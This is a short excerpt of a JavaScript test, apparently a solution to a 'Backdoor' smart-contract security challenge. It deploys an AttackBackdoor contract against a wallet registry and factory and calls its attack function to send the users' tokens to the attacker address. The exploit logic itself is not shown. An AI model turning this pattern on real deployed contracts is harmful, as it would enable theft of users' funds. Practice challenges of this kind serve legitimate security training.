...
describe('[Challenge] Backdoor', function () {
    ...
    it('Exploit', async function () {
        ...
        attackerContract = await (await ethers.getContractFactory('AttackBackdoor', attacker))
            .deploy(this.masterCopy.address, this.walletRegistry.address, this.walletFactory.address);

            // address tokenAddress,address hacker, address[] calldata users
        await attackerContract.connect(attacker).attack(this.token.address, attacker.address, users);
